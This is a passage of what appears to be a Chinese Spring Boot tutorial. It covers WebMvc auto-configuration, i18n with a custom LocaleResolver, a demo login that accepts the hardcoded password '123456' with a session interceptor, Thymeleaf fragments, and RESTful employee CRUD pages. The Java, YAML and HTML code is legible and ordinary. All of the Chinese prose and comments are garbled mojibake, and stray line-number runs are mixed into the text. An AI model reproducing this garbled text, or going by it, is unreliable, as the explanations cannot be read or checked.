}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåçï¼\n\n 1. @EnableWebMvcçæ ¸å¿\n\n@Import(DelegatingWebMvcConfiguration.class)\npublic @interface EnableWebMvc {\n\n\n1\n2\n\n\n 2. @Configuration\n    public class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport {\n    \n    \n    1\n    2\n    \n\n 3. @Configuration\n    @ConditionalOnWebApplication\n    @ConditionalOnClass({ Servlet.class, DispatcherServlet.class,\n                         WebMvcConfigurerAdapter.class })\n    //å®¹å¨ä¸­æ²¡æè¿ä¸ªç»ä»¶çæ¶åï¼è¿ä¸ªèªå¨éç½®ç±»æçæ\n    @ConditionalOnMissingBean(WebMvcConfigurationSupport.class)\n    @AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)\n    @AutoConfigureAfter({ DispatcherServletAutoConfiguration.class,\n                         ValidationAutoConfiguration.class })\n    public class WebMvcAutoConfiguration {\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 4. @EnableWebMvcå°WebMvcConfigurationSupportç»ä»¶å¯¼å¥è¿æ¥\n\n\n# ä¿®æ¹Spingbooté»è®¤éç½®\n\nSpringBootå¨èªå¨éç½®å¾å¤ç»ä»¶çæ¶åï¼åçå®¹å¨ä¸­ææ²¡æç¨æ·èªå·±éç½®çï¼@Beanã@Componentï¼å¦ææï¼å°±ç¨ç¨æ·éç½®çãå¦ææ²¡æï¼æèªå¨éç½®ãå¦ææäºç»ä»¶å¯ä»¥æå¤ä¸ªï¼ViewResolverï¼å°ç¨æ·éç½®çåèªå·±é»è®¤çç»åèµ·æ¥ä½¿ç¨ã\n\nå¨SpringBootä¸­ä¼æéå¸¸å¤çxxxConfigurerå¸®å©æä»¬è¿è¡æ©å±éç½®ãå¨SpringBootä¸­ä¼æå¾å¤çxxxCustomizerå¸®å©æä»¬è¿è¡å®å¶éç½®\n\n\n# RestFulCRUD\n\n# 1. å¼å¥éæèµæº\n\næ ¹æ®ä¸é¢çSpringbootå³äºéæèµæºçèªå¨éç½®ï¼æä»¬åªéè¦å°éæèµæºæ¾ç½®å°æå®çç®å½ä¸­ï¼å¦ææå¡å¨å¤çä¸äºæå®çè¯·æ±ï¼å°±ä¼å»éæèµæºæä»¶å¤¹ä¸å¯»æ¾ãæä»¬å¨é¡µé¢ä¸­å¼å¥éæèµæºæ¶ï¼ä¹å¯ä»¥ä½¿ç¨thymeleafçè¯­æ³ï¼è¿æ ·å¨è¯·æ±æ¶å°±å¯ä»¥æé¤é¡¹ç®åç§°å¯¹äºéæèµæºçå½±åäºã\n\n# 2. å½éåä¿¡æ¯\n\n * åå»ºå½éåéç½®æä»¶\n   \n   # ========= é»è®¤properties\n   login.btn=ç»å½~\n   login.password=å¯ç ~\n   login.remember=è®°ä½æ~\n   login.tip=è¯·ç»å½~\n   login.username=ç¨æ·å~\n   \n   # ========= Login_en_US\n   login.btn=Login In.\n   login.password=Password\n   login.remember=Remember Me.\n   login.tip=Please login.\n   login.username=Username\n   \n   # ========= Login_zh_CN\n   login.btn=ç»å½\n   login.password=å¯ç \n   login.remember=è®°ä½æ\n   login.tip=è¯·ç»å½\n   login.username=ç¨æ·å\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n * ç±äºspringbootå·²ç»å¸®å©æä»¬éç½®å¥½äºï¼æä»¬åªéè¦å¨é¡µé¢ä¸åå¼å°±å¯ä»¥äºãä½æ¯ç±äºé»è®¤éç½®çè·¯å¾æ¯ç±»è·¯å¾ä¸çmessageï¼æä»¬çå½éåæä»¶æ¾ç½®å¨i18nç®å½ä¸ï¼éè¦å¨springbootéç½®æä»¶ä¸­æå®è·¯å¾ã\n   \n   @Configuration\n   @ConditionalOnMissingBean(value = MessageSource.class, search = SearchStrategy.CURRENT)\n   @AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)\n   @Conditional(ResourceBundleCondition.class)\n   @EnableConfigurationProperties\n   @ConfigurationProperties(prefix = "spring.messages")\n   public class MessageSourceAutoConfiguration {\n   \n       private String basename = "messages";\n   \n       @Bean\n       public MessageSource messageSource() {\n           ResourceBundleMessageSource messageSource = new ResourceBundleMessageSource();\n           if (StringUtils.hasText(this.basename)) {\n               messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(\n                   StringUtils.trimAllWhitespace(this.basename)));\n           }\n           if (this.encoding != null) {\n               messageSource.setDefaultEncoding(this.encoding.name());\n           }\n           messageSource.setFallbackToSystemLocale(this.fallbackToSystemLocale);\n           messageSource.setCacheSeconds(this.cacheSeconds);\n           messageSource.setAlwaysUseMessageFormat(this.alwaysUseMessageFormat);\n           return messageSource;\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   \n   \n   spring:\n     messages:\n       basename: i18n/login\n   \n   \n   1\n   2\n   3\n   \n\n * Thymeleafè·åå½éåçå¼\n   \n   <!DOCTYPE html>\n   <html lang="en" xmlns:th="https://www.thymeleaf.org">\n   \t<head>\n   \t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n   \t\t<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n   \t\t<meta name="description" content="">\n   \t\t<meta name="author" content="">\n   \t\t<title>Signin Template for Bootstrap</title>\n   \t\t\x3c!-- Bootstrap core CSS --\x3e\n   \t\t<link th:href="@{/asserts/css/bootstrap.min.css}" rel="stylesheet">\n   \t\t\x3c!-- Custom styles for this template --\x3e\n   \t\t<link th:href="@{/asserts/css/signin.css}" rel="stylesheet">\n   \t</head>\n   \n   \t<body class="text-center">\n   \t\t<form class="form-signin" action="dashboard.html">\n   \t\t\t<img class="mb-4" src="asserts/img/bootstrap-solid.svg" alt="" width="72" height="72">\n   \t\t\t<h1 class="h3 mb-3 font-weight-normal" th:text="#{login.tip}">Please sign in</h1>\n   \t\t\t<label class="sr-only" th:text="#{login.username}">Username</label>\n   \t\t\t<input type="text" class="form-control" th:placeholder="#{login.username}" placeholder="Username" required="" autofocus="">\n   \t\t\t<label class="sr-only" th:text="#{login.password}">Password</label>\n   \t\t\t<input type="password" class="form-control" th:placeholder="#{login.password}" placeholder="Password" required="">\n   \t\t\t<div class="checkbox mb-3">\n   \t\t\t\t<label>\n             <input type="checkbox" value="remember-me"> [[#{login.remember}]]\n           </label>\n   \t\t\t</div>\n   \t\t\t<button class="btn btn-lg btn-primary btn-block" type="submit">[[#{login.btn}]]</button>\n   \t\t\t<p class="mt-5 mb-3 text-muted">Â© 2017-2018</p>\n   \t\t\t<a class="btn btn-sm">ä¸­æ</a>\n   \t\t\t<a class="btn btn-sm">English</a>\n   \t\t</form>\n   \n   \t</body>\n   \n   </html>\t\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   \n\nspringbootå®æå½éåçåçï¼\n\næå¡å¨ç¥éæä»¬éè¦è¿è¡å½éåçè¯­è¨ï¼æ¯å ä¸ºæä»¬å¨åéè¯·æ±æ¶ï¼è¯·æ±åæºå¸¦äºä¸ä¸ªAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7å­æ®µï¼æå¡å¨æ ¹æ®è¯¥å­æ®µå°æå®çå½éåé¡µé¢è¿åãææ¶åæä»¬å¸æèªå®ä¹å½éåçè§åï¼æ¯å¦å¨è¯·æ±åæ°ä¸­æºå¸¦å½åé¡µé¢çå½éååæ°ã\n\n<a class="btn btn-sm" th:href="@{/index(language=\'zh_CN\')}">ä¸­æ</a>\n<a class="btn btn-sm" th:href="@{/index(language=\'en_US\')}">English</a>\n\n\n1\n2\n\n\nèªå®ä¹å½éåå¤çå¨ï¼\n\npackage com.pwddd.springboot.component;\n\nimport org.apache.tomcat.jni.Local;\nimport org.springframework.util.StringUtils;\nimport org.springframework.web.servlet.LocaleResolver;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.util.Locale;\n\npublic class ParamLocalResolver implements LocaleResolver {\n    @Override\n    public Locale resolveLocale(HttpServletRequest httpServletRequest) {\n        String language = httpServletRequest.getParameter("language");\n        Locale locale = Locale.getDefault();\n        if (!StringUtils.isEmpty(language)){\n            String[] s = language.split("_");\n            locale = new Locale(s[0],s[1]);\n        }else{\n            String languages = httpServletRequest.getHeader("Accept-Language");\n            String defaultLanguage = languages.split(",")[0];\n            String[] split = defaultLanguage.split("-");\n            locale = new Locale(split[0],split[1]);\n        }\n        return locale;\n    }\n\n    @Override\n    public void setLocale(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Locale locale) {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\næ³¨åå½éåå¤çå¨ï¼å°æä»¬èªå·±çå½éåå¤çå¨æ¾å°å®¹å¨ä¸­ã\n\n@Bean\npublic LocaleResolver localeResolver(){\n    return new ParamLocalResolver();\n}\n\n\n1\n2\n3\n4\n\n\n# 3. ç»å½åè½\n\nè¿æ¬¡è®¾è®¡çç»å½åè½å°±ä¸éè¦é¾æ¥æ°æ®åºäºï¼åªè¦æäº¤äºç¨æ·åï¼å¹¶ä¸å¯ç ä¸º123456å°±å¤å®ä¸ºç»å½æåã\n\n * æ§å¶å¨è®¾ç½®\n   \n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(@RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               return "dashboard";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   \n\n * éè¯¯ä¿¡æ¯æ¾ç¤º\n   \n   <p style="color: red" th:text="${msg}" th:if="${not #strings.isEmpty(msg)}" ></p>\n   å½msgä¸æ¯ç©ºçæ¶åæ¾ç¤ºã\n   \n   \n   1\n   2\n   \n\n * å¤çç»å½ä¿¡æ¯éå¤æäº¤ - ä½¿ç¨éå®å\n   \n   // è®¾ç½®è§å¾è§£æ\n   registry.addViewController("/main").setViewName("dashboard");\n   \n   // ä¿®æ¹æ§å¶å¨\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(@RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               return "redirect:/main";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   \n\n * ç»å½æ¦æªå¨æºå¶\n   \n   // ç»å½æ·»å cookie\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import javax.servlet.http.HttpSession;\n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(HttpSession httpSession,\n                           @RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               httpSession.setAttribute("username",username);\n               return "redirect:/main";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   // è®¾ç½®æ¦æªå¨\n   package com.pwddd.springboot.component;\n   \n   import org.springframework.util.StringUtils;\n   import org.springframework.web.servlet.HandlerInterceptor;\n   import org.springframework.web.servlet.ModelAndView;\n   \n   import javax.servlet.http.HttpServletRequest;\n   import javax.servlet.http.HttpServletResponse;\n   import javax.servlet.http.HttpSession;\n   \n   public class LoginHandlerInterceptor implements HandlerInterceptor {\n       @Override\n       public boolean preHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o) throws Exception {\n           // ä»Sessionè·åä¿¡æ¯\n           HttpSession session = httpServletRequest.getSession();\n           String username = (String) session.getAttribute("username");\n           if (StringUtils.isEmpty(username)){\n               httpServletRequest.setAttribute("msg","æ²¡ææéä½¿ç¨~");\n               httpServletRequest.getRequestDispatcher("/index").forward(httpServletRequest,httpServletResponse);\n   \n               return false;\n           }else {\n               return true;\n           }\n       }\n   \n       @Override\n       public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {\n   \n       }\n   \n       @Override\n       public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {\n   \n       }\n   }\n   \n   \n   // æ·»å å°å®¹å¨\n   @Override\n   public void addInterceptors(InterceptorRegistry registry) {\n       registry.addInterceptor(new LoginHandlerInterceptor())\n           .addPathPatterns("/**")\n           .excludePathPatterns("/login","/index","/user/login");\n   }\n   \n   springbootå·²ç»åå¥½äºéæèµæºæ å°ï¼å æ­¤ä¸éè¦æä»¬è¿è¡å¤çã\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   \n\n# 4. å¬å±é¡µé¢æ½ååé«äº®å¤ç\n\næ½åå¬å±çæ®µ\n<div th:fragment="copy">\n&copy; 2011 The Good Thymes Virtual Grocery\n</div>\n2ãå¼å¥å¬å±çæ®µ\n<div th:insert="~{footer :: copy}"></div>\n~{templatename::selector}ï¼æ¨¡æ¿å::éæ©å¨\n~{templatename::fragmentname}:æ¨¡æ¿å::çæ®µå\n3ãé»è®¤ææï¼\ninsertçå¬å±çæ®µå¨divæ ç­¾ä¸­\nå¦æä½¿ç¨th:insertç­å±æ§è¿è¡å¼å¥ï¼å¯ä»¥ä¸ç¨å~{}ï¼\nè¡ååæ³å¯ä»¥å ä¸ï¼[[~{}]];[(~{})]ï¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä¸ç§å¼å¥å¬å±çæ®µçthå±æ§ï¼\n\n * th:insertï¼å°å¬å±çæ®µæ´ä¸ªæå¥å°å£°æå¼å¥çåç´ ä¸­\n * th:replaceï¼å°å£°æå¼å¥çåç´ æ¿æ¢ä¸ºå¬å±çæ®µ\n * th:includeï¼å°è¢«å¼å¥ççæ®µçåå®¹åå«è¿è¿ä¸ªæ ç­¾ä¸­\n\n<footer th:fragment="copy">\n    &copy; 2011 The Good Thymes Virtual Grocery\n</footer>\nå¼å¥æ¹å¼\n<div th:insert="footer :: copy"></div>\n<div th:replace="footer :: copy"></div>\n<div th:include="footer :: copy"></div>\nææ\n<div>\n    <footer>\n        &copy; 2011 The Good Thymes Virtual Grocery\n    </footer>\n</div>\n<footer>\n    &copy; 2011 The Good Thymes Virtual Grocery\n</footer>\n<div>\n    &copy; 2011 The Good Thymes Virtual Grocery\n</div>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ½åæ¹å¼ï¼å°ææçå¬å±é¡µé¢æ¾å°templatesç®å½ä¸çcommonä¸­ï¼å¨å¯»æ¾çæ®µæ¶ä¹ä¼å»éµå¾ªæ¨¡æ¿çæ å°ã\n\n<nav th:fragment="navbar" class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0">\n    <a class="navbar-brand col-sm-3 col-md-2 mr-0" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">[[${session.username}]]</a>\n    <input class="form-control form-control-dark w-100" type="text" placeholder="Search" aria-label="Search">\n    <ul class="navbar-nav px-3">\n        <li class="nav-item text-nowrap">\n            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">Sign out</a>\n        </li>\n    </ul>\n</nav>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¼å¥æ¹å¼ï¼\n\n<div th:replace="common/bar :: navbar" ></div>\n\t\x3c!--ä½¿ç¨éæ©å¨å¼å¥ï¼--\x3e\n<div th:replace="common/bar :: #sidebar" ></div>\n\n\n1\n2\n3\n\n\nå¨æä»¬çé¡µé¢ä¸­ï¼å½æä»¬éæ©åå·¥ç®¡çæ¶ï¼ä¾§è¾¹æ å¹¶æ²¡æé«äº®å°åå·¥ç®¡çæ ç­¾ï¼bootstrapä¸­ä½¿ç¨activeå±æ§æ¥æ§å¶æ ç­¾æ¯å¦é«äº®ã\n\næä»¬å¯ä»¥ä½¿ç¨åæ°åççæ®µç­¾åæ¥å¨æçæå®æ ç­¾ï¼\n\nå¨å¼å¥çæ®µæ¶ä¼ å¥åæ°ï¼å¨é¡µé¢ä¸å¤æ­åæ°ï¼å¨ææ·»å activeã\n\n<a class="nav-link" th:class="${activeUri == \'emps\' ? \'nav-link active\' : \'nav-link\'}"\n   th:href="@{/emps}">\n    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users">\n        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>\n        <circle cx="9" cy="7" r="4"></circle>\n        <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>\n        <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>\n    </svg>\n    åå·¥ç®¡ç\n</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¨å¼å¥çæ¶åæå®åæ°ï¼\n\n<div th:replace="common/bar :: #sidebar(acitveUrl=\'main\')" ></div>\n\n\n1\n\n\n# 5.Restfulè¯·æ±\n\nå®éªåè½                 è¯·æ±URI   è¯·æ±æ¹å¼\næ¥è¯¢ææåå·¥               emps    GET\næ¥è¯¢æä¸ªåå·¥(æ¥å°ä¿®æ¹é¡µé¢)       emp/1   GET\næ¥å°æ·»å é¡µé¢               emp     GET\næ·»å åå·¥                 emp     POST\næ¥å°ä¿®æ¹é¡µé¢ï¼æ¥åºåå·¥è¿è¡ä¿¡æ¯åæ¾ï¼   emp/1   GET\nä¿®æ¹åå·¥                 emp     PUT\nå é¤åå·¥                 emp/1   DELETE\n\n * æ¥è¯¢å¨é¨åå·¥ä¿¡æ¯\n   \n   @GetMapping("/emps")\n   public String empList(Model model){\n       Collection<Employee> employees = employeeDao.getAll();\n       model.addAttribute("emps",employees);\n       return "emp/list";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n       <h2>åå·¥åè¡¨</h2>\n       <a class="btn btn-secondary btn-success">æ°å¢</a>\n   \n       <div class="table-responsive">\n           <table class="table table-striped table-sm">\n               <thead>\n                   <tr>\n                       <th>#</th>\n                       <th>å§å</th>\n                       <th>é®ç®±</th>\n                       <th>æ§å«</th>\n                       <th>çæ¥</th>\n                       <th>é¨é¨</th>\n                       <th>æä½</th>\n                   </tr>\n               </thead>\n               <tbody>\n                   <tr th:each="emp:${emps}">\n                       <td th:text="${emp.id}"></td>\n                       <td th:text="${emp.lastName}"></td>\n                       <td th:text="${emp.email}"></td>\n                       <td th:text="${emp.gender} == 0? \'å¥³\':\'ç·\'"></td>\n                       <td th:text="${#dates.format(emp.birth,\'yyyy-MM-dd\')}"></td>\n                       <td th:text="${emp.department.departmentName}"></td>\n                       <td>\n                           <button class="btn btn-sm btn-primary">ä¿®æ¹</button>\n                           <button class="btn btn-sm btn-danger">å é¤</button>\n                       </td>\n                   </tr>\n               </tbody>\n           </table>\n       </div>\n   </main>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   \n\n * åå·¥æ·»å æä½\n   \n   <a class="btn btn-secondary btn-success" th:href="@{/emp}">æ°å¢</a>\n   \n   \n   1\n   \n   \n   <!DOCTYPE html>\n   \x3c!-- saved from url=(0052)http://getbootstrap.com/docs/4.0/examples/dashboard/ --\x3e\n   <html lang="en" xmlns:th="http://www.thymeleaf.org">\n   \n       <head>\n           <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n           <meta name="description" content="">\n           <meta name="author" content="">\n   \n           <title>Dashboard Template for Bootstrap</title>\n           \x3c!-- Bootstrap core CSS --\x3e\n           <link href="asserts/css/bootstrap.min.css" th:href="@{/webjars/bootstrap/4.0.0/css/bootstrap.css}" rel="stylesheet">\n   \n           \x3c!-- Custom styles for this template --\x3e\n           <link href="asserts/css/dashboard.css" th:href="@{/asserts/css/dashboard.css}" rel="stylesheet">\n           <style type="text/css">\n               /* Chart.js */\n   \n               @-webkit-keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               @keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               .chartjs-render-monitor {\n                   -webkit-animation: chartjs-render-animation 0.001s;\n                   animation: chartjs-render-animation 0.001s;\n               }\n           </style>\n       </head>\n   \n       <body>\n           \x3c!--å¼å¥æ½åçtopbar--\x3e\n           \x3c!--æ¨¡æ¿åï¼ä¼ä½¿ç¨thymeleafçååç¼éç½®è§åè¿è¡è§£æ--\x3e\n           <div th:replace="common/bar::navbar"></div>\n   \n           <div class="container-fluid">\n               <div class="row">\n                   \x3c!--å¼å¥ä¾§è¾¹æ --\x3e\n                   <div th:replace="common/bar::#sidebar(activeUri=\'emps\')"></div>\n   \n                   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n                       \x3c!--éè¦åºåæ¯åå·¥ä¿®æ¹è¿æ¯æ·»å ï¼--\x3e\n                       <form th:action="@{/emp}" method="post">\n                           \x3c!--åéputè¯·æ±ä¿®æ¹åå·¥æ°æ®--\x3e\n                           \x3c!--\n   1ãSpringMVCä¸­éç½®HiddenHttpMethodFilter;ï¼SpringBootèªå¨éç½®å¥½çï¼\n   2ãé¡µé¢åå»ºä¸ä¸ªpostè¡¨å\n   3ãåå»ºä¸ä¸ªinputé¡¹ï¼name="_method";å¼å°±æ¯æä»¬æå®çè¯·æ±æ¹å¼\n   --\x3e\n                           <input type="hidden" name="_method" value="put" th:if="${emp!=null}"/>\n                           <input type="hidden" name="id" th:if="${emp!=null}" th:value="${emp.id}">\n                           <div class="form-group">\n                               <label>LastName</label>\n                               <input name="lastName" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${emp.lastName}">\n                           </div>\n                           <div class="form-group">\n                               <label>Email</label>\n                               <input name="email" type="email" class="form-control" placeholder="zhangsan@atguigu.com" th:value="${emp!=null}?${emp.email}">\n                           </div>\n                           <div class="form-group">\n                               <label>Gender</label><br/>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="1" th:checked="${emp!=null}?${emp.gender==1}">\n                                   <label class="form-check-label">ç·</label>\n                               </div>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="0" th:checked="${emp!=null}?${emp.gender==0}">\n                                   <label class="form-check-label">å¥³</label>\n                               </div>\n                           </div>\n                           <div class="form-group">\n                               <label>department</label>\n                               \x3c!--æäº¤çæ¯é¨é¨çid--\x3e\n                               <select class="form-control" name="department.id">\n                                   <option th:selected="${emp!=null}?${dept.id == emp.department.id}" th:value="${dept.id}" th:each="dept:${depts}" th:text="${dept.departmentName}">1</option>\n                               </select>\n                           </div>\n                           <div class="form-group">\n                               <label>Birth</label>\n                               <input name="birth" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${#dates.format(emp.birth, \'yyyy-MM-dd HH:mm\')}">\n                           </div>\n                           <button type="submit" class="btn btn-primary" th:text="${emp!=null}?\'ä¿®æ¹\':\'æ·»å \'">æ·»å </button>\n                       </form>\n                   </main>\n               </div>\n           </div>\n   \n           \x3c!-- Bootstrap core JavaScript\n   ================================================== --\x3e\n           \x3c!-- Placed at the end of the document so the pages load faster --\x3e\n           <script type="text/javascript" src="asserts/js/jquery-3.2.1.slim.min.js" th:src="@{/webjars/jquery/3.3.1/jquery.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/popper.min.js" th:src="@{/webjars/popper.js/1.11.1/dist/popper.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/bootstrap.min.js" th:src="@{/webjars/bootstrap/4.0.0/js/bootstrap.js}"><\/script>\n   \n           \x3c!-- Icons --\x3e\n           <script type="text/javascript" src="asserts/js/feather.min.js" th:src="@{/asserts/js/feather.min.js}"><\/script>\n           <script>\n               feather.replace()\n           <\/script>\n   \n       </body>\n   \n   </html>\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   81\n   82\n   83\n   84\n   85\n   86\n   87\n   88\n   89\n   90\n   91\n   92\n   93\n   94\n   95\n   96\n   97\n   98\n   99\n   100\n   101\n   102\n   103\n   104\n   105\n   106\n   107\n   108\n   109\n   110\n   111\n   112\n   113\n   114\n   115\n   116\n   117\n   118\n   \n   \n   @GetMapping("/emp")\n   public String empPage(Model model){\n       Collection<Department> departments = departmentDao.getDepartments();\n       model.addAttribute("depts",departments);\n       return "emp/add";\n   }\n   \n   @PostMapping("/emp")\n   public String save(Employee employee){\n       employeeDao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   \n   \n   æäº¤æ¶å¦æåºç°400éè¯¯è¯´æç±»åè½¬ååºç°äºé®é¢ï¼é»è®¤æç§yyyy/MM/ddè¿è¡æ ¼å¼åã\n   \n   \n\n@Bean\n@ConditionalOnProperty(prefix = "spring.mvc", name = "date-format")\npublic Formatter<Date> dateFormatter() {\n    return new DateFormatter(this.mvcProperties.getDateFormat());\n}\n\npublic String getDateFormat() {\n    return this.dateFormat;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦å¨éç½®æä»¶ä¸­éç½®æ ¼å¼åæ¥æçæ ¼å¼ï¼spring.mvc.date-format: yyyy-MM-dd\n\n * åå·¥ä¿®æ¹é¡µé¢\n   \n   <a class="btn btn-sm btn-primary" 